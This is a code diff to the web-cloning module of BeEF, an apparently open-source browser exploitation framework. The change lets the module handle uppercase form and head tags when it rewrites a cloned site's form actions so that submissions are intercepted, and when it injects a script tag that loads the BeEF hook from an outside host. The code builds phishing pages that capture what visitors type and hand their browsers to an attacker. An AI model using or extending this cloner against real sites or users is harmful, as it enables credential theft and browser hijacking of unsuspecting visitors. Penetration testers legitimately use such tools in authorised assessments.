@@ -57,7 +57,7 @@ module BeEF
               File.open("#{@cloned_pages_dir + output_mod}", 'w') do |out_file|
                 File.open("#{@cloned_pages_dir + output}", 'r').each do |line|
                   # Modify the <form> line changing the action URI to / in order to be properly intercepted by BeEF
-                  if line.include?("<form ")
+                  if line.include?("<form ") || line.include?("<FORM ")
                     line_attrs = line.split(" ")
                     c = 0
                     cc = 0
@@ -87,7 +87,7 @@ module BeEF
                     print_info "Form action value changed in order to be intercepted :-D"
                     out_file.print mod_form
                     # Add the BeEF hook
-                  elsif line.include?("</head>") && @config.get('beef.extension.social_engineering.web_cloner.add_beef_hook')
+                  elsif (line.include?("</head>") || line.include?("</HEAD>")) && @config.get('beef.extension.social_engineering.web_cloner.add_beef_hook')
                     out_file.print add_beef_hook(line)
                     print_info "BeEF hook added :-D"
                   else
@@ -128,7 +128,11 @@ module BeEF
         private
         # Replace </head> with <BeEF_hook></head>
         def add_beef_hook(line)
-           line.gsub!("</head>","<script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</head>")
+           if line.include?("</head>")
+             line.gsub!("</head>","<script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</head>")
+           elsif
+             line.gsub!("</HEAD>","<script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</HEAD>")
+           end
            line
         end
 
